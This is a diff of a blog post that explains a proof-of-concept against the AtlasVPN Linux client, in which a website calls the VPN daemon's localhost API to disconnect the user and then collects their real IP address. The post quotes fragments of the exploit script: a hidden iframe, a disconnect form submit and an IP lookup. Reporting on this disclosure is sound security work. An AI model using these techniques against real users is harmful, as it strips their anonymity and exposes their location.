@@ -18,7 +18,8 @@ Two days ago, a throwaway account named ‘Educational-Map-8145’ (I’ll call 
 According to EM8, the AtlasVPN runs both a client and a daemon, and the client connects via “API on localhost on port 8076”. As any program can access localhost -  including websites - the malicious javascript could be run in any website to cause the VPN to disconnect, exposing the real IP of the user, which can be collected (included in the PoC script). Fortunately, EM8 firmly stated that the code was “not intended for illegal purposes”, so AltasVPN users should be fine.
 
 # Breakdown of Script (Very Complex Steps) 
-1. Send a command to stop the VPN 
+1. Send a command to stop the VPN
+
 ```
 </code></pre>
    <iframe id="hiddenFrame" name="hiddenFrame" style="display: none;"></iframe>
@@ -39,6 +40,7 @@ According to EM8, the AtlasVPN runs both a client and a daemon, and the client c
       logDiv.innerHTML += "[-] Sending disconnect request to atlasvpnd...\n";
       document.getElementById('stopForm').submit();
 ```
+
 2. Grab Real IP address
    
 ```
@@ -54,6 +56,7 @@ According to EM8, the AtlasVPN runs both a client and a daemon, and the client c
           ipAddress = response.ip;
            logDiv.innerHTML += '[?] Current IP:' + ipAddress + "\n";
 ```
+
 > The Reddit poster has the code in [full](https://www.reddit.com/r/cybersecurity/comments/167f16e/atlasvpn_linux_client_103_remote_disconnect/).
 {: .prompt-info }
 
